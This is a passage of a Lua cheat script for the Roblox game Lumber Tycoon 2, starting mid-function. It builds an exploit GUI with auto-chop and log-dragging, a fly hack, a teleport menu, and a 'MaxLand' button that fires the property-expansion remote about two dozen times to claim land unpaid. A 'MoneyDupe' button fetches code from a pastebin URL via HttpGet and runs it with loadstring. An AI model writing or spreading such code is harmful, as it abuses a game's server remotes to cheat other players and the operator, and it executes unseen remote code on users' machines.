	local Ps = nil
	for i, v in pairs(game.Workspace.Properties:GetChildren()) do
	if v.Owner.Value == game.Players[PlayerName] then
	Ps = v.OriginSquare.Position + Vector3.new(0,30,0)
	end
	end
	for i,v in pairs(game.Workspace:GetDescendants()) do
	    if v:FindFirstChild("TreeClass") and v.TreeClass.Value == Wood and v.Name == "Model" then
	    Teleport(v.WoodSection.Position.X,v.WoodSection.Position.Y,v.WoodSection.Position.Z)
	    for i=1,50 do
	    wait(0.0001)
	    axe(v)
	    end
	for i,v in pairs(Workspace.LogModels:GetChildren()) do
	if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer and v.TreeClass.Value == Wood then
	game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
	v:MoveTo(Ps)
	game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
	v:MoveTo(Ps)
	game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
	v:MoveTo(Ps)
	game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
	end
	end
	Counter = Counter + 1
	if Quantitys - Counter == 0 then
	print("Breaked")
	break
	end
	wait(0.2)
	end
	end
	wait(0.2)
	for i, v in pairs(game.Workspace.Properties:GetChildren()) do
	if v.Owner.Value == game.Players[PlayerName] then
	Teleport(v.OriginSquare.Position.X, v.OriginSquare.Position.Y + 3.2, v.OriginSquare.Position.Z)
	end
	end
	end
	GoldSwampy.MouseButton1Down:connect(function()
	GetTree("GoldSwampy", "LocalPlayer", QuantityTree.Text)
	end)
	
	GreenSwampy.MouseButton1Down:connect(function()
	GetTree("GreenSwampy", "LocalPlayer", QuantityTree.Text)
	end)
	CaveCrawler.MouseButton1Down:connect(function()
	GetTree("CaveCrawler", "LocalPlayer", QuantityTree.Text)
	end)
	Frost.MouseButton1Down:connect(function()
	GetTree("Frost", "LocalPlayer", QuantityTree.Text)
	end)
	Koa.MouseButton1Down:connect(function()
	GetTree("Koa", "LocalPlayer", QuantityTree.Text)
	end)
	Oak.MouseButton1Down:connect(function()
	GetTree("Oak", "LocalPlayer", QuantityTree.Text)
	end)
	Volcano.MouseButton1Down:connect(function()
	GetTree("Volcano", "LocalPlayer", QuantityTree.Text)
	end)
	SnowGlow.MouseButton1Down:connect(function()
	GetTree("SnowGlow", "LocalPlayer", QuantityTree.Text)
	end)
	Walnut.MouseButton1Down:connect(function()
	GetTree("Walnut", "LocalPlayer", QuantityTree.Text)
	end)
	Birch.MouseButton1Down:connect(function()
	GetTree("Birch", "LocalPlayer", QuantityTree.Text)
	end)
	Generic.MouseButton1Down:connect(function()
	GetTree("Generic", "LocalPlayer", QuantityTree.Text)
	end)
	Cherry.MouseButton1Down:connect(function()
	GetTree("Cherry", "LocalPlayer", QuantityTree.Text)
	end)
	Fir.MouseButton1Down:connect(function()
	GetTree("Fir", "LocalPlayer", QuantityTree.Text)
	end)
	Pine.MouseButton1Down:connect(function()
	GetTree("Pine", "LocalPlayer", QuantityTree.Text)
	end)
	Sinister.MouseButton1Down:connect(function()
	GetTree("SpookyNeon", "LocalPlayer", QuantityTree.Text)
	end)
	Spooky.MouseButton1Down:connect(function()
	GetTree("Spooky", "LocalPlayer", QuantityTree.Text)
	end)
	Palm.MouseButton1Down:connect(function()
	GetTree("Palm", "LocalPlayer", QuantityTree.Text)
	end)
	BWoodX.MouseButton1Down:connect(function()
	EvGornjeBringW.Visible = false
	end)
	end)
end
coroutine.wrap(KHUENF_fake_script)()
local function XOIV_fake_script() -- CloseButton.CloseScript 
	local script = Instance.new('LocalScript', CloseButton)

	script.Parent.MouseButton1Click:Connect(function()
	
	 script.Parent.Parent.Visible = false
	
	end)
end
coroutine.wrap(XOIV_fake_script)()
local function OIFMQGJ_fake_script() -- Fly.Script 
	local script = Instance.new('Script', Fly)

	Fly.MouseButton1Click:connect(function()
		-- fly
	repeat wait()
	    until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
	local mouse = game.Players.LocalPlayer:GetMouse()
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer
	local torso = plr.Character.Torso
	local flying = true
	local deb = true
	local ctrl = {f = 0, b = 0, l = 0, r = 0}
	local lastctrl = {f = 0, b = 0, l = 0, r = 0}
	local maxspeed = 50
	local speed = 0
	 
	function fly()
	local bg = Instance.new("BodyGyro", torso)
	bg.P = 9e4
	bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
	bg.cframe = torso.CFrame
	local bv = Instance.new("BodyVelocity", torso)
	bv.velocity = Vector3.new(0,0.1,0)
	bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
	repeat wait()
	plr.Character.Humanoid.PlatformStand = true
	if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
	speed = speed+.5+(speed/maxspeed)
	if speed > maxspeed then
	speed = maxspeed
	end
	elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
	speed = speed-1
	if speed < 0 then
	speed = 0
	end
	end
	if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
	bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
	lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
	elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
	bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
	else
	bv.velocity = Vector3.new(0,0.1,0)
	end
	bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
	until not flying
	ctrl = {f = 0, b = 0, l = 0, r = 0}
	lastctrl = {f = 0, b = 0, l = 0, r = 0}
	speed = 0
	bg:Destroy()
	bv:Destroy()
	plr.Character.Humanoid.PlatformStand = false
	end
	mouse.KeyDown:connect(function(key)
	if key:lower() == "f" then
	if flying then flying = false
	else
	flying = true
	fly()
	end
	elseif key:lower() == "w" then
	ctrl.f = 1
	elseif key:lower() == "s" then
	ctrl.b = -1
	elseif key:lower() == "a" then
	ctrl.l = -1
	elseif key:lower() == "d" then
	ctrl.r = 1
	end
	end)
	mouse.KeyUp:connect(function(key)
	if key:lower() == "w" then
	ctrl.f = 0
	elseif key:lower() == "s" then
	ctrl.b = 0
	elseif key:lower() == "a" then
	ctrl.l = 0
	elseif key:lower() == "d" then
	ctrl.r = 0
	end
	end)
	fly()
	end)
	
end
coroutine.wrap(OIFMQGJ_fake_script)()
local function QMFWYV_fake_script() -- InstantTP.Script 
	local script = Instance.new('Script', InstantTP)

	InstantTP.MouseButton1Down:connect(function() 
	
	-- Made By z_8
	
	-- Please give credits if used in videos
	
	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local Credits = Instance.new("TextButton")
	local WoodRUs = Instance.new("TextButton")
	local SpawnPoint = Instance.new("TextButton")
	local LandStore = Instance.new("TextButton")
	local LinksLogic = Instance.new("TextButton")
	local Cave = Instance.new("TextButton")
	local Volcano = Instance.new("TextButton")
	local Swamp = Instance.new("TextButton")
	local PalmIsland = Instance.new("TextButton")
	local FancyFurnishings = Instance.new("TextButton")
	local BoxedCars = Instance.new("TextButton")
	local Frame_2 = Instance.new("Frame")
	local BobsShack = Instance.new("TextButton")
	local ShrineOfSight = Instance.new("TextButton")
	local SkiLodge = Instance.new("TextButton")
	local FineArtsShop = Instance.new("TextButton")
	local EndTimes = Instance.new("TextButton")
	local Dock = Instance.new("TextButton")
	local Bridge = Instance.new("TextButton")
	local StrangeMan = Instance.new("TextButton")
	
	
	
	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
	Frame.Parent = ScreenGui
	Frame.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
	Frame.BorderColor3 = Color3.fromRGB(29, 29, 29)
	Frame.Position = UDim2.new(0.00861008558, 0, 0.055240795, 0)
	Frame.Size = UDim2.new(0, 137, 0, 647)
	
	Credits.Name = "Credits"
	Credits.Parent = Frame
	Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Credits.Position = UDim2.new(0.0510948896, 0, 0.0108864699, 0)
	Credits.Size = UDim2.new(0, 121, 0, 28)
	Credits.Font = Enum.Font.SourceSans
	Credits.Text = " z_8即时传送"
	Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
	Credits.TextSize = 14.000
	
	WoodRUs.Name = "Wood R Us"
	WoodRUs.Parent = Frame
	WoodRUs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	WoodRUs.Position = UDim2.new(0.0583941601, 0, 0.063763611, 0)
	WoodRUs.Size = UDim2.new(0, 121, 0, 28)
	WoodRUs.Font = Enum.Font.SourceSans
	WoodRUs.Text = "木材反斗城"
	WoodRUs.TextColor3 = Color3.fromRGB(0, 0, 0)
	WoodRUs.TextSize = 14.000
	WoodRUs.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(265, 5, 57))
	end)
	
	SpawnPoint.Name = "SpawnPoint"
	SpawnPoint.Parent = Frame
	SpawnPoint.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	SpawnPoint.Position = UDim2.new(0.0583941601, 0, 0.116640747, 0)
	SpawnPoint.Size = UDim2.new(0, 121, 0, 28)
	SpawnPoint.Font = Enum.Font.SourceSans
	SpawnPoint.Text = "生成点"
	SpawnPoint.TextColor3 = Color3.fromRGB(0, 0, 0)
	SpawnPoint.TextSize = 14.000
	SpawnPoint.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(155, 5, 74))
	end)
	
	LandStore.Name = "Land Store"
	LandStore.Parent = Frame
	LandStore.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	LandStore.Position = UDim2.new(0.0510948896, 0, 0.171073094, 0)
	LandStore.Size = UDim2.new(0, 121, 0, 28)
	LandStore.Font = Enum.Font.SourceSans
	LandStore.Text = "土地商店"
	LandStore.TextColor3 = Color3.fromRGB(0, 0, 0)
	LandStore.TextSize = 14.000
	LandStore.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(258, 5, -99))
	end)
	
	LinksLogic.Name = "Link's Logic"
	LinksLogic.Parent = Frame
	LinksLogic.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	LinksLogic.Position = UDim2.new(0.0510948896, 0, 0.223950237, 0)
	LinksLogic.Size = UDim2.new(0, 121, 0, 28)
	LinksLogic.Font = Enum.Font.SourceSans
	LinksLogic.Text = "登录链接"
	LinksLogic.TextColor3 = Color3.fromRGB(0, 0, 0)
	LinksLogic.TextSize = 14.000
	LinksLogic.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(4607, 9, -798))
	end)
	
	Cave.Name = "Cave"
	Cave.Parent = Frame
	Cave.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Cave.Position = UDim2.new(0.0583941601, 0, 0.278382599, 0)
	Cave.Size = UDim2.new(0, 121, 0, 28)
	Cave.Font = Enum.Font.SourceSans
	Cave.Text = "洞穴"
	Cave.TextColor3 = Color3.fromRGB(0, 0, 0)
	Cave.TextSize = 14.000
	Cave.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(3581, -177, 430))
	end)
	
	Volcano.Name = "Volcano"
	Volcano.Parent = Frame
	Volcano.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Volcano.Position = UDim2.new(0.0510948896, 0, 0.332814932, 0)
	Volcano.Size = UDim2.new(0, 121, 0, 28)
	Volcano.Font = Enum.Font.SourceSans
	Volcano.Text = "火山"
	Volcano.TextColor3 = Color3.fromRGB(0, 0, 0)
	Volcano.TextSize = 14.000
	Volcano.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(-1585, 625, 1140))
	end)
	
	Swamp.Name = "Swamp"
	Swamp.Parent = Frame
	Swamp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Swamp.Position = UDim2.new(0.0510948896, 0, 0.38569206, 0)
	Swamp.Size = UDim2.new(0, 121, 0, 28)
	Swamp.Font = Enum.Font.SourceSans
	Swamp.Text = "沼泽"
	Swamp.TextColor3 = Color3.fromRGB(0, 0, 0)
	Swamp.TextSize = 14.000
	Swamp.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(-1209, 138, -801))
	end)
	
	PalmIsland.Name = "Palm Island"
	PalmIsland.Parent = Frame
	PalmIsland.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	PalmIsland.Position = UDim2.new(0.0583941601, 0, 0.438569188, 0)
	PalmIsland.Size = UDim2.new(0, 121, 0, 28)
	PalmIsland.Font = Enum.Font.SourceSans
	PalmIsland.Text = "棕榈岛"
	PalmIsland.TextColor3 = Color3.fromRGB(0, 0, 0)
	PalmIsland.TextSize = 14.000
	PalmIsland.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(2549, 5, -42))
	end)
	
	FancyFurnishings.Name = "Fancy Furnishings"
	FancyFurnishings.Parent = Frame
	FancyFurnishings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	FancyFurnishings.Position = UDim2.new(0.0510948896, 0, 0.491446316, 0)
	FancyFurnishings.Size = UDim2.new(0, 121, 0, 28)
	FancyFurnishings.Font = Enum.Font.SourceSans
	FancyFurnishings.Text = "花式家具"
	FancyFurnishings.TextColor3 = Color3.fromRGB(0, 0, 0)
	FancyFurnishings.TextSize = 14.000
	FancyFurnishings.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(491, 13, -1720))
	end)
	
	BoxedCars.Name = "Boxed Cars"
	BoxedCars.Parent = Frame
	BoxedCars.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	BoxedCars.Position = UDim2.new(0.0510948896, 0, 0.491446316, 0)
	BoxedCars.Size = UDim2.new(0, 121, 0, 28)
	BoxedCars.Font = Enum.Font.SourceSans
	BoxedCars.Text = "盒装车"
	BoxedCars.TextColor3 = Color3.fromRGB(0, 0, 0)
	BoxedCars.TextSize = 14.000
	BoxedCars.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(509, 5.2, -1463))
	end)
	
	Frame_2.Parent = Frame
	Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Frame_2.Position = UDim2.new(0.0437956192, 0, 0.97167933, 0)
	Frame_2.Size = UDim2.new(0, 121, 0, 11)
	
	BobsShack.Name = "Bob's Shack"
	BobsShack.Parent = Frame
	BobsShack.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	BobsShack.Position = UDim2.new(0.0510948896, 0, 0.597200632, 0)
	BobsShack.Size = UDim2.new(0, 121, 0, 28)
	BobsShack.Font = Enum.Font.SourceSans
	BobsShack.Text = "鲍勃的屋子"
	BobsShack.TextColor3 = Color3.fromRGB(0, 0, 0)
	BobsShack.TextSize = 14.000
	BobsShack.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(260, 10, -2542))
	end)
	
	ShrineOfSight.Name = "Shrine Of Sight"
	ShrineOfSight.Parent = Frame
	ShrineOfSight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ShrineOfSight.Position = UDim2.new(0.0510948896, 0, 0.864696741, 0)
	ShrineOfSight.Size = UDim2.new(0, 121, 0, 28)
	ShrineOfSight.Font = Enum.Font.SourceSans
	ShrineOfSight.Text = "视线圣地"
	ShrineOfSight.TextColor3 = Color3.fromRGB(0, 0, 0)
	ShrineOfSight.TextSize = 14.000
	ShrineOfSight.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(-1600, 205, 919))
	end)
	
	SkiLodge.Name = "Ski Lodge"
	SkiLodge.Parent = Frame
	SkiLodge.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	SkiLodge.Position = UDim2.new(0.0510948896, 0, 0.811819613, 0)
	SkiLodge.Size = UDim2.new(0, 121, 0, 28)
	SkiLodge.Font = Enum.Font.SourceSans
	SkiLodge.Text = "滑雪板"
	SkiLodge.TextColor3 = Color3.fromRGB(0, 0, 0)
	SkiLodge.TextSize = 14.000
	SkiLodge.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(1244, 66, 2306))
	end)
	
	FineArtsShop.Name = "Fine Arts Shop"
	FineArtsShop.Parent = Frame
	FineArtsShop.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	FineArtsShop.Position = UDim2.new(0.0437956192, 0, 0.544323504, 0)
	FineArtsShop.Size = UDim2.new(0, 121, 0, 28)
	FineArtsShop.Font = Enum.Font.SourceSans
	FineArtsShop.Text = "美术商店"
	FineArtsShop.TextColor3 = Color3.fromRGB(0, 0, 0)
	FineArtsShop.TextSize = 14.000
	FineArtsShop.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(5207, -156, 719))
	end)
	
	EndTimes.Name = "End Times"
	EndTimes.Parent = Frame
	EndTimes.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	EndTimes.Position = UDim2.new(0.0437956192, 0, 0.919129074, 0)
	EndTimes.Size = UDim2.new(0, 121, 0, 28)
	EndTimes.Font = Enum.Font.SourceSans
	EndTimes.Text = "结束商店"
	EndTimes.TextColor3 = Color3.fromRGB(0, 0, 0)
	EndTimes.TextSize = 14.000
	EndTimes.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(113, -204, -951))
	end)
	
	Dock.Name = "Dock"
	Dock.Parent = Frame
	Dock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Dock.Position = UDim2.new(0.0510948896, 0, 0.65007776, 0)
	Dock.Size = UDim2.new(0, 121, 0, 28)
	Dock.Font = Enum.Font.SourceSans
	Dock.Text = "码头"
	Dock.TextColor3 = Color3.fromRGB(0, 0, 0)
	Dock.TextSize = 14.000
	Dock.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(1114, 3.2, -197))
	end)
	
	
	Bridge.Name = "Bridge"
	Bridge.Parent = Frame
	Bridge.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Bridge.Position = UDim2.new(0.0437956192, 0, 0.704510093, 0)
	Bridge.Size = UDim2.new(0, 121, 0, 28)
	Bridge.Font = Enum.Font.SourceSans
	Bridge.Text = "桥"
	Bridge.TextColor3 = Color3.fromRGB(0, 0, 0)
	Bridge.TextSize = 14.000
	Bridge.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(113, 15, -977))
	end)
	
	StrangeMan.Name = "Strange Man"
	StrangeMan.Parent = Frame
	StrangeMan.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	StrangeMan.Position = UDim2.new(0.0437956192, 0, 0.758942485, 0)
	StrangeMan.Size = UDim2.new(0, 121, 0, 28)
	StrangeMan.Font = Enum.Font.SourceSans
	StrangeMan.Text = "陌生人"
	StrangeMan.TextColor3 = Color3.fromRGB(0, 0, 0)
	StrangeMan.TextSize = 14.000
	StrangeMan.MouseButton1Down:connect(function()
	function Tlprt(Cframe)
	    game.Players.LocalPlayer.Character.Humanoid.Jump = true
	    wait(0.1)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
	end
	Tlprt(CFrame.new(1061, 20, 1131))
	end)
	end)
end
coroutine.wrap(QMFWYV_fake_script)()
local function HHTW_fake_script() -- MaxLand.Script 
	local script = Instance.new('Script', MaxLand)

	MaxLand.MouseButton1Click:connect(function()
	    for i, v in pairs(game:GetService("Workspace").Properties:GetChildren()) do
	        if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
	            base = v
	            square = v.OriginSquare
	            end
	        end
	    function makebase(pos)
	        local Event = game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty
	        Event:FireServer(base, pos)
	        end
	    spos = square.Position
	    makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z))
	    makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z))
	    makebase(CFrame.new(spos.X, spos.Y, spos.Z + 40))
	    makebase(CFrame.new(spos.X, spos.Y, spos.Z - 40))
	    makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 40))
	    makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 40))
	    makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 40))
	    makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 40))
	    makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z))
	    makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z))
	    makebase(CFrame.new(spos.X, spos.Y, spos.Z + 80))
	    makebase(CFrame.new(spos.X, spos.Y, spos.Z - 80))
	--Corners--
	    makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 80))
	    makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 80))
	    makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 80))
	    makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 80))
	--Corners--
	    makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 80))
	    makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 80))
	    makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 40))
	    makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 40))
	    makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 40))
	    makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 40))
	    makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 80))
	    makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 80))
	end)
end
coroutine.wrap(HHTW_fake_script)()
local function FARKY_fake_script() -- MoneyDupe.Script 
	local script = Instance.new('Script', MoneyDupe)

	MoneyDupe.MouseButton1Down:connect(function() 	
	
	script=loadstring(game:HttpGet("https://pastebin.com/raw/XwLSKeAc", true))()
	
	end)
end
coroutine.wrap(FARKY_fake_script)()
local function CAVE_fake_script() -- PaintTool.Script 
	local script = Instance.new('Script', PaintTool)

	PaintTool.MouseButton1Down:connect(function() 
	-- Instances:
	local ColorPicker = Instance.new("ScreenGui")
	local ChangeColor = Instance.new("Frame")
	local CurrentColor = Instance.new("ImageButton")
	local Picker = Instance.new("ScrollingFrame")
	local Birch = Instance.new("ImageButton")
	local DropShadow = Instance.new("Frame")
	local Grey = Instance.new("ImageButton")
	local DropShadow_2 = Instance.new("Frame")
	local Walnut = Instance.new("ImageButton")
	local DropShadow_3 = Instance.new("Frame")
	local Generic = Instance.new("ImageButton")
	local DropShadow_4 = Instance.new("Frame")
	local Oak = Instance.new("ImageButton")
	local DropShadow_5 = Instance.new("Frame")
	local Pine = Instance.new("ImageButton")
	local DropShadow_6 = Instance.new("Frame")
	local Palm = Instance.new("ImageButton")
	local DropShadow_7 = Instance.new("Frame")
	local Cherry = Instance.new("ImageButton")
	local DropShadow_8 = Instance.new("Frame")
	local Koa = Instance.new("ImageButton")
	local DropShadow_9 = Instance.new("Frame")
	local Volcano = Instance.new("ImageButton")
	local DropShadow_10 = Instance.new("Frame")
	local GreenSwampy = Instance.new("ImageButton")
	local DropShadow_11 = Instance.new("Frame")
	local GoldSwampy = Instance.new("ImageButton")
	local DropShadow_12 = Instance.new("Frame")
	local GenericSpecial = Instance.new("ImageButton")
	local DropShadow_13 = Instance.new("Frame")
	local SnowGlow = Instance.new("ImageButton")
	local DropShadow_14 = Instance.new("Frame")
	local Frost = Instance.new("ImageButton")
	local DropShadow_15 = Instance.new("Frame")
	local CaveCrawler = Instance.new("ImageButton")
	local DropShadow_16 = Instance.new("Frame")
	local LoneCave = Instance.new("ImageButton")
	local DropShadow_17 = Instance.new("Frame")
	local Spooky = Instance.new("ImageButton")
	local DropShadow_18 = Instance.new("Frame")
	local SpookyNeon = Instance.new("ImageButton")
	local DropShadow_19 = Instance.new("Frame")
	--Properties:
	ColorPicker.Name = "ColorPicker"
	ColorPicker.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	
	ChangeColor.Name = "ChangeColor"
	ChangeColor.Parent = ColorPicker
	ChangeColor.BackgroundColor3 = Color3.new(0.176471, 0.254902, 0.427451)
	ChangeColor.BorderColor3 = Color3.new(0, 0, 0)
	ChangeColor.BorderSizePixel = 2
	ChangeColor.Position = UDim2.new(0, 10, 1, -110)
	ChangeColor.Size = UDim2.new(0, 100, 0, 100)
	ChangeColor.ZIndex = 2
	ColorPicker.Enabled = false
	
	CurrentColor.Name = "CurrentColor"
	CurrentColor.Parent = ChangeColor
	CurrentColor.BackgroundColor3 = Color3.new(0.176471, 0.254902, 0.427451)
	CurrentColor.BorderColor3 = Color3.new(0, 0, 0)
	CurrentColor.BorderSizePixel = 2
	CurrentColor.Position = UDim2.new(0, 10, 0, 10)
	CurrentColor.Size = UDim2.new(0, 80, 0, 80)
	CurrentColor.ZIndex = 2
	CurrentColor.Image = "rbxassetid://2712547918"
	CurrentColor.ScaleType = Enum.ScaleType.Crop
	
	Picker.Name = "Picker"
	Picker.Parent = ColorPicker
	Picker.BackgroundColor3 = Color3.new(0.176471, 0.254902, 0.427451)
	Picker.BorderColor3 = Color3.new(0, 0, 0)
	Picker.BorderSizePixel = 2
	Picker.Position = UDim2.new(0, 10, 1, -320)
	Picker.Size = UDim2.new(0, 100, 0, 200)
	Picker.CanvasPosition = Vector2.new(0, 700)
	Picker.CanvasSize = UDim2.new(0, 0, 0, 900)
	Picker.ScrollBarThickness = 7
	Picker.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left
	Picker.Visible = false
	
	Birch.Name = "Birch"
	Birch.Parent = Picker
	Birch.BackgroundColor3 = Color3.new(1, 1, 1)
	Birch.BorderColor3 = Color3.new(0, 0, 0)
	Birch.Position = UDim2.new(0, 10, 0, 5)
	Birch.Size = UDim2.new(0, 80, 0, 40)
	Birch.ZIndex = 3
	Birch.Image = "rbxassetid://2712547918"
	Birch.ScaleType = Enum.ScaleType.Crop
	
	DropShadow.Name = "DropShadow"
	DropShadow.Parent = Birch
	DropShadow.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow.BorderSizePixel = 0
	DropShadow.Position = UDim2.new(0, 4, 0, 4)
